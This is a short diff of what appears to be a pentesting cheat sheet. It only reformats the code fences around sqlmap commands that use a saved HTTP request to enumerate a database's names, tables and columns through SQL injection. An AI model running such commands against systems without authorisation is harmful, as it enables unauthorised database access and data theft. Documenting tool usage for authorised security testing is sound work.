@@ -5,7 +5,8 @@ sqlmap -r req.txt --level 3 --risk 3 --dbs
 ```
 ```
 sqlmap -r req.txt --level 3 --risk 3 -D YOURDATABASE--tables
-```	
+```
+```
 sqlmap -r req.txt --level 3 --risk 3 -D YOURDATABASE -T YOURTABLE --columns
 ```
 ```
